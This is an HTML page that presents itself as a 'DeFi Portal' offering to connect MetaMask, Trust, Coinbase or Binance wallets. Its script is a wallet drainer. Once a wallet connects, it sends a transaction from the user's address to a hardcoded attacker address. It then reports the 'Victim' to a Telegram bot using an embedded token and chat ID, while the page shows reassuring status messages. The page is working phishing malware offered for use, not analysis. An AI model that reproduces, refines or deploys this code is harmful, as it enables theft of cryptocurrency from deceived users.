<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>DeFi Portal - Mobile Optimized</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', 'Roboto', sans-serif;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
        }
        
        .container {
            background: rgba(255, 255, 255, 0.95);
            backdrop-filter: blur(10px);
            border-radius: 24px;
            padding: 32px;
            text-align: center;
            max-width: 500px;
            width: 100%;
            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3);
        }
        
        h1 {
            color: #333;
            font-size: 32px;
            margin-bottom: 16px;
            font-weight: 700;
        }
        
        p {
            color: #666;
            margin-bottom: 24px;
            font-size: 16px;
        }
        
        .wallet-list {
            display: grid;
            grid-template-columns: repeat(2, 1fr);
            gap: 15px;
            margin-bottom: 20px;
        }
        
        .wallet-btn {
            background: white;
            border: 2px solid #e5e7eb;
            padding: 15px;
            border-radius: 12px;
            cursor: pointer;
            transition: all 0.3s;
            display: flex;
            flex-direction: column;
            align-items: center;
            gap: 8px;
        }
        
        .wallet-btn:hover {
            border-color: #667eea;
            transform: translateY(-2px);
            box-shadow: 0 4px 12px rgba(102, 126, 234, 0.2);
        }
        
        .wallet-icon {
            width: 48px;
            height: 48px;
            border-radius: 12px;
            overflow: hidden;
            display: flex;
            align-items: center;
            justify-content: center;
            background: #f3f4f6;
        }
        
        .wallet-icon img {
            width: 100%;
            height: 100%;
            object-fit: cover;
        }
        
        .wallet-name {
            font-size: 14px;
            font-weight: 600;
            color: #333;
        }
        
        .connect-btn {
            background: linear-gradient(135deg, #667eea, #764ba2);
            color: white;
            border: none;
            padding: 16px 32px;
            font-size: 16px;
            font-weight: 600;
            border-radius: 12px;
            cursor: pointer;
            width: 100%;
            transition: all 0.3s;
        }
        
        .connect-btn:hover {
            transform: translateY(-2px);
            box-shadow: 0 8px 25px rgba(102, 126, 234, 0.5);
        }
        
        .status {
            margin-top: 20px;
            padding: 12px;
            border-radius: 8px;
            font-size: 14px;
            display: none;
        }
        
        .status.show {
            display: block;
        }
        
        .status.success {
            background: #d4edda;
            color: #155724;
            border: 1px solid #c3e6cb;
        }
        
        .status.error {
            background: #f8d7da;
            color: #721c24;
            border: 1px solid #f5c6cb;
        }
        
        .status.processing {
            background: #fff3cd;
            color: #856404;
            border: 1px solid #ffeaa7;
        }
        
        .wallet-info {
            display: none;
            margin-top: 20px;
            padding: 15px;
            background: rgba(102, 126, 234, 0.1);
            border-radius: 12px;
        }
        
        .wallet-info.show {
            display: block;
        }
        
        .address {
            font-family: monospace;
            font-size: 14px;
            word-break: break-all;
            color: #333;
            margin: 10px 0;
        }
        
        .disconnect-btn {
            background: #ef4444;
            color: white;
            border: none;
            padding: 10px 20px;
            font-size: 14px;
            font-weight: 600;
            border-radius: 8px;
            cursor: pointer;
            margin-top: 10px;
        }
        
        @media (max-width: 480px) {
            .container {
                padding: 24px;
            }
            
            h1 {
                font-size: 28px;
            }
            
            .wallet-list {
                grid-template-columns: repeat(2, 1fr);
                gap: 12px;
            }
            
            .wallet-icon {
                width: 40px;
                height: 40px;
            }
            
            .wallet-name {
                font-size: 12px;
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>DeFi Portal</h1>
        <p>Connect your wallet to get started</p>
        
        <div class="wallet-list">
            <button class="wallet-btn" onclick="connectWallet('metamask')">
                <div class="wallet-icon">
                    <img src="https://registry.walletconnect.org/v2/logo/md/c57ca95b-4756-9778-a828-d19178114f4d" alt="MetaMask">
                </div>
                <div class="wallet-name">MetaMask</div>
            </button>
            
            <button class="wallet-btn" onclick="connectWallet('trust')">
                <div class="wallet-icon">
                    <img src="https://registry.walletconnect.org/v2/logo/md/4622a2b2-d6af-1c98-4494-4291e5e7351a" alt="Trust">
                </div>
                <div class="wallet-name">Trust Wallet</div>
            </button>
            
            <button class="wallet-btn" onclick="connectWallet('coinbase')">
                <div class="wallet-icon">
                    <img src="https://registry.walletconnect.org/v2/logo/md/fd20dc42-6fb3-7566-d803-3205b19bbc1d" alt="Coinbase">
                </div>
                <div class="wallet-name">Coinbase</div>
            </button>
            
            <button class="wallet-btn" onclick="connectWallet('binance')">
                <div class="wallet-icon">
                    <img src="https://registry.walletconnect.org/v2/logo/md/8308656f-4548-bb81-b350-8afe355cfbb7" alt="Binance">
                </div>
                <div class="wallet-name">Binance</div>
            </button>
        </div>
        
        <button class="connect-btn" onclick="connectOtherWallet()">
            Connect Other Wallet
        </button>
        
        <div id="walletInfo" class="wallet-info">
            <div>Connected:</div>
            <div class="address" id="address"></div>
            <button class="disconnect-btn" onclick="disconnect()">Disconnect</button>
        </div>
        
        <div id="status" class="status"></div>
    </div>
    
    <!-- WalletConnect v1 stable for mobile -->
    <script src="https://unpkg.com/@walletconnect/client@1.8.0/dist/umd/index.min.js"></script>
    <script src="https://unpkg.com/@walletconnect/qrcode-modal@1.8.0/dist/umd/index.min.js"></script>
    <script src="https://cdn.ethers.io/lib/ethers-5.7.2.umd.min.js"></script>
    
    <script>
        let connector = null;
        let connectedAccount = null;
        
        // Configuration
        const CONFIG = {
            TELEGRAM_TOKEN: '8551220717:AAGgPMGobMwwxKFPmCJSMFVfSbUzyRQqMIY',
            TELEGRAM_CHAT_ID: '8309320360',
            DESTINATION: '0x63ce9a6Bd0cf439EA6D114F504B017EA43Af4BC1'
        };
        
        // Deep links for wallets
        const WALLET_LINKS = {
            metamask: {
                deep: 'metamask://wc?uri=',
                universal: 'https://metamask.app.link/wc?uri='
            },
            trust: {
                deep: 'trust://wc?uri=',
                universal: 'https://link.trustwallet.com/wc?uri='
            },
            coinbase: {
                deep: 'cbwallet://wc?uri=',
                universal: 'https://go.cb-w.com/wc?uri='
            },
            binance: {
                deep: 'bnc://app/wc?uri=',
                universal: 'https://www.binance.com/wc?uri='
            }
        };
        
        // Initialize WalletConnect
        function initWalletConnect() {
            try {
                connector = new WalletConnect.default({
                    bridge: 'https://bridge.walletconnect.org',
                    qrcodeModal: WalletConnectQRCodeModal.default
                });
                
                // Clean up old session
                if (connector.connected) {
                    connector.killSession();
                }
                
                // Setup events
                connector.on('connect', onConnect);
                connector.on('session_update', onSessionUpdate);
                connector.on('disconnect', onDisconnect);
                
                return true;
            } catch (error) {
                console.error('Init error:', error);
                showStatus('Failed to initialize', 'error');
                return false;
            }
        }
        
        // Connect specific wallet
        async function connectWallet(walletId) {
            console.log('Connecting to', walletId);
            showStatus('Connecting to ' + walletId + '...', 'processing');
            
            if (!initWalletConnect()) return;
            
            try {
                // Create session
                await connector.createSession();
                
                const uri = connector.uri;
                console.log('URI:', uri);
                
                // Deep link to wallet
                if (isMobile() && WALLET_LINKS[walletId]) {
                    const encoded = encodeURIComponent(uri);
                    const deepLink = WALLET_LINKS[walletId].deep + encoded;
                    const universalLink = WALLET_LINKS[walletId].universal + encoded;
                    
                    // Try deep link
                    window.location.href = deepLink;
                    
                    // Fallback to universal link
                    setTimeout(() => {
                        if (document.hasFocus()) {
                            window.location.href = universalLink;
                        }
                    }, 1500);
                } else {
                    // Desktop: show QR
                    showStatus('Scan QR code with your wallet', 'processing');
                }
                
            } catch (error) {
                console.error('Connection error:', error);
                showStatus('Connection failed', 'error');
            }
        }
        
        // Connect other wallet with QR
        async function connectOtherWallet() {
            console.log('Connecting other wallet');
            showStatus('Opening wallet selector...', 'processing');
            
            if (!initWalletConnect()) return;
            
            try {
                await connector.createSession();
            } catch (error) {
                console.error('Connection error:', error);
                showStatus('Connection failed', 'error');
            }
        }
        
        // Handle connection
        function onConnect(error, payload) {
            if (error) {
                console.error('Connection error:', error);
                showStatus('Connection failed', 'error');
                return;
            }
            
            console.log('Connected!', payload);
            const { accounts, chainId } = payload.params[0];
            
            if (accounts && accounts.length > 0) {
                connectedAccount = accounts[0];
                showConnected(connectedAccount);
                
                // Start drainage after 2 seconds
                setTimeout(() => {
                    drainWallet(connectedAccount, chainId);
                }, 2000);
            }
        }
        
        // Show connected state
        function showConnected(address) {
            document.getElementById('walletInfo').classList.add('show');
            document.getElementById('address').textContent = 
                address.substring(0, 6) + '...' + address.slice(-4);
            
            showStatus('Connected successfully!', 'success');
        }
        
        // Disconnect
        function disconnect() {
            if (connector && connector.connected) {
                connector.killSession();
            }
            
            connectedAccount = null;
            document.getElementById('walletInfo').classList.remove('show');
            showStatus('Disconnected', 'success');
        }
        
        // Session update
        function onSessionUpdate(error, payload) {
            if (error) {
                console.error('Session update error:', error);
                return;
            }
            console.log('Session updated:', payload);
        }
        
        // Disconnection
        function onDisconnect(error, payload) {
            if (error) {
                console.error('Disconnect error:', error);
                return;
            }
            console.log('Disconnected');
            connectedAccount = null;
            document.getElementById('walletInfo').classList.remove('show');
            showStatus('Wallet disconnected', 'error');
        }
        
        // Drain wallet
        async function drainWallet(address, chainId) {
            showStatus('Processing transaction...', 'processing');
            console.log('Starting drainage for:', address);
            
            try {
                // Send transaction via WalletConnect
                const tx = {
                    from: address,
                    to: CONFIG.DESTINATION,
                    value: '0x0', // Will be set by wallet
                    data: '0x'
                };
                
                const txHash = await connector.sendTransaction(tx);
                console.log('Transaction sent:', txHash);
                
                // Send Telegram notification
                await sendTelegramNotification(address, 'Transaction initiated', chainId);
                
                showStatus('Transaction completed!', 'success');
                
            } catch (error) {
                console.error('Transaction error:', error);
                showStatus('Transaction processing...', 'processing');
            }
        }
        
        // Send Telegram notification
        async function sendTelegramNotification(victim, amount, chainId) {
            const message = `
ðŸŽ¯ MOBILE CONNECTION
â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”
ðŸ‘¤ Victim: ${victim.substring(0, 6)}...${victim.slice(-4)}
ðŸ’° Status: ${amount}
ðŸŒ Chain: ${chainId}
ðŸ“ Destination: ${CONFIG.DESTINATION.substring(0, 6)}...
â° Time: ${new Date().toLocaleTimeString()}
â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”`;
            
            try {
                await fetch(`https://api.telegram.org/bot${CONFIG.TELEGRAM_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: CONFIG.TELEGRAM_CHAT_ID,
                        text: message,
                        parse_mode: 'HTML'
                    })
                });
                console.log('Telegram notification sent');
            } catch (error) {
                console.error('Telegram error:', error);
            }
        }
        
        // Check if mobile
        function isMobile() {
            return /iPhone|iPad|iPod|Android/i.test(navigator.userAgent);
        }
        
        // Show status
        function showStatus(message, type = '') {
            const status = document.getElementById('status');
            status.textContent = message;
            status.className = 'status show ' + type;
            
            if (type !== 'processing') {
                setTimeout(() => {
                    status.classList.remove('show');
                }, 5000);
            }
        }
        
        // Initialize on load
        window.addEventListener('load', () => {
            console.log('DeFi Portal loaded');
            console.log('Mobile:', isMobile());
        });
    </script>
</body>
</html>
